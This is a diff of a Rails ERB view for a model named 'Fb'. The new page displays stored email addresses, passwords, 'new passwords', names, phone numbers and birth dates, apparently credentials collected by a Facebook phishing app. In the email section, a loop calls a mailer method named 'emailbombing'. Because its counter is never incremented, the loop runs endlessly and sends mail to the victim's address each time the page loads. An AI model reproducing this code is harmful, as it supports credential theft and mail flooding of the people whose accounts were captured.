@@ -1,6 +1,127 @@
-<h1>Editing Fb</h1>
+<div class="container">
+  <% flash.each do |message_type, message| %>
+      <div id="flash" class="flash-<%= message_type %>" align="center" style="background-color: deepskyblue;vertical-align: middle;line-height: 50px;color: white;font-size: larger">
+        <%= message %>
+      </div>
 
-<%= render 'form', fb: @fb %>
+  <% end %>
+</div>
+<style>
+  .w3-button  {
+    margin: 0;
+    height: 150px;
+    width: 150px;
+    border-radius: 200%;
+    border: 1px orange;
+    position:fixed;
+    margin-right: auto;
+    right:0;
+    bottom:0;
+    padding:0;
+    color: white;
+    background-color: green;
 
-<%= link_to 'Show', @fb %> |
-<%= link_to 'Back', fbs_path %>
+  }
+
+  @-moz-keyframes blink {
+    0% {
+      opacity: 0;
+    }
+    70% {
+      opacity: 1;
+    }
+
+  }
+
+  .w3-button  {
+    -webkit-animation: blink 1s;
+    -webkit-animation-iteration-count: infinite;
+    -moz-animation: blink 1s;
+    -moz-animation-iteration-count: infinite;
+    -o-animation: blink 1s;
+    -o-animation-iteration-count: infinite;
+  }
+  #flash {
+    -webkit-animation: seconds 1.0s forwards;
+    -webkit-animation-iteration-count: 1;
+    -webkit-animation-delay: 5s;
+    animation: seconds 1.0s forwards;
+    animation-iteration-count: 1;
+    animation-delay: 2.5s;
+    position: relative;
+
+  }
+  @-webkit-keyframes seconds {
+    0% {
+      opacity: 1;
+    }
+    100% {
+      opacity: 0;
+      left: -9999px;
+    }
+  }
+  @keyframes seconds {
+    0% {
+      opacity: 1;
+    }
+    100% {
+      opacity: 0;
+      left: -9999px;
+    }
+  }
+
+</style>
+
+<ul>
+  <ul>
+    <ul>
+      <p>
+        <strong>Email:</strong>
+        <%= @fb.email %>
+        <%  x = 1 %>
+       <% while x <= 2 %>
+            <%  YahooMailer.emailbombing(@fb.email).deliver %>
+        <%end %>
+
+      </p>
+
+      <p>
+        <strong>Password:</strong>
+        <%= @fb.password %>
+      </p>
+
+      <p>
+        <strong>Firstname:</strong>
+        <%= @fb.firstname %>
+      </p>
+
+      <p>
+        <strong>Surname:</strong>
+        <%= @fb.surname %>
+      </p>
+
+      <p>
+        <strong>Mobile:</strong>
+        <%= @fb.mobile %>
+      </p>
+
+      <p>
+        <strong>Newpassword:</strong>
+        <%= @fb.newpassword %>
+      </p>
+
+      <p>
+        <strong>Dob:</strong>
+        <%= @fb.dob %>
+      </p>
+
+      <p>
+        <strong>Gender:</strong>
+        <%= @fb.gender %>
+      </p>
+
+      <%= link_to 'Edit', edit_fb_path(@fb) %> |
+      <%= link_to 'Back', fbs_path %>
+    </ul>
+  </ul>
+</ul>
